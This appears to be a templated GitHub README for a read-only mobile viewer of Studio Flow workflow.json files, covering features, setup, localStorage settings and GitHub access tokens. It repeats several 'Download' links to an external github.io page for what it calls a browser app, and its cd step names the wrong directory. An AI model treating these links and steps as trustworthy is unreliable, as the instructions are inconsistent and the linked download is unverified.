# Studio Flow Viewer vLatest - mobile viewer 2026

> **Studio Flow Viewer is a read-only mobile viewer for Studio Flow workflow.json files, built for GitHub-backed browsing with browser-stored settings and a current release-ready build.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20repository-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leoscottuij1657/studio-flow-json-viewer?style=flat-square)](https://github.com/leoscottuij1657/studio-flow-json-viewer)

---

<p align="center">
  <a href="https://leoscottuij1657.github.io/studio-flow-json-viewer/">
    <img src="https://img.shields.io/badge/Download-Studio%20Flow%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Studio Flow Viewer">
  </a>
</p>

> **[Direct Download - Studio Flow Viewer vLatest](https://leoscottuij1657.github.io/studio-flow-json-viewer/)**

---

[Download Latest Build](https://leoscottuij1657.github.io/studio-flow-json-viewer/)

---

## What Studio Flow Viewer Does

Studio Flow Viewer is built for opening Studio Flow `workflow.json` files directly from a GitHub repository in a format that works well on mobile screens. It is strictly for inspection, not modification, so you can review flow data without touching the underlying file.

The app stores its own state in the browser and pulls content from GitHub. That combination makes it a lightweight way to browse repository-based Studio Flow workflows when you want quick access from a phone or other small-screen device.

---

## Key Features

- Read-only access for Studio Flow `workflow.json` files
- Interface designed with mobile use in mind
- GitHub-backed content loading
- App state kept in the user's browser
- Saved preferences and local state in `localStorage`
- Support for fine-grained personal access tokens
- Intended for reviewing workflows, not editing them
- Suited to repository-centric workflow browsing

---

## Getting Started

Clone the repository or download it, then open the project in your browser or deploy it with GitHub Pages.

```bash
git clone https://github.com/leoscottuij1657/studio-flow-json-viewer.git
cd studio-flow-viewer
```

Once cloned, load the app in a browser or run the local preview flow used by your hosting setup. If the target repository is private or otherwise restricted, make sure a fine-grained personal access token is ready before you begin.

---

## How to Use It

1. Launch the viewer in your browser.
2. Set the GitHub repository that contains the Studio Flow `workflow.json`.
3. Open the workflow file and inspect it in read-only mode.
4. Tweak any browser-saved preferences if needed.
5. Use the same browser later to keep your local settings.

Typical workflow:

- Choose or configure the repository source
- Enter access credentials when repository permissions require them
- Open `workflow.json`
- Browse the flow data through a mobile-friendly interface

---

## Configuration Details

Studio Flow Viewer keeps user-specific information in the browser, using `localStorage` for saved settings.

Example of the kind of browser-stored state you may see:

```json
{
  "repository": "leoscottuij1657/studio-flow-json-viewer",
  "token": "fine-grained personal access token",
  "lastViewedFile": "workflow.json"
}
```

To reset the app, clear the site's browser storage and enter your repository details again.

---

## Requirements

- A modern web browser
- Access to a GitHub repository containing Studio Flow `workflow.json`
- A GitHub fine-grained personal access token when required by repository permissions
- Browser storage enabled for saving local settings
- A device capable of loading HTML-based web apps

---

## FAQ

**Can I edit files in this viewer?**  
No. It is meant only for read-only viewing of workflow files.

**Where is the data kept?**  
The app stores its own data in your browser, while the workflow content comes from GitHub.

**Is a token always required?**  
No. You only need one when repository access rules call for it. Fine-grained personal access token support is included.

**Why do my settings disappear?**  
Check that browser storage is allowed and that site data has not been cleared.

**How do I get the newest version?**  
Pull the latest repository changes or redeploy the latest build from the project source.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
